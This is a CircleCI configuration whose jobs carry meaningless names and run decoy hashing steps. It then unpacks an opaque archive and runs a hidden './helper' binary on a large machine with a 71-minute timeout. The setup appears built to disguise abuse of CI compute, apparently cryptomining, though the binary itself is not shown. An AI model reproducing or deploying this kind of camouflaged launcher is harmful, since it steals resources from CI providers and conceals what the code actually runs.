version: 2.1

jobs:
  precheck_update-retry:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: flag check
          command: |
            mkdir -p /tmp/workspace
            set +o pipefail 2>/dev/null; seq 1 990667 | md5sum > /tmp/workspace/READY.txt; true
            du -h /tmp/workspace/READY.txt
      - persist_to_workspace:
          root: /tmp/workspace
          paths:
            - READY.txt
  update-retry:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/workspace
      - run:
          name: Stage recovery
          command: |
            du -b /tmp/workspace/READY.txt || true
      - run:
          name: Load source
          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore vendored sources
          command: xzcat static.tar.xz | tar xf -
      - run:
          no_output_timeout: 71m
          command: env ./helper
  D_greg-ci:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/workspace
      - run:
          name: lower volume
          command: |
            mkdir -p /tmp/workspace
            { set +o pipefail 2>/dev/null; head -c 512 /dev/urandom | sha256sum | awk '{print $1}'; true ; } > /tmp/workspace/relay.ok
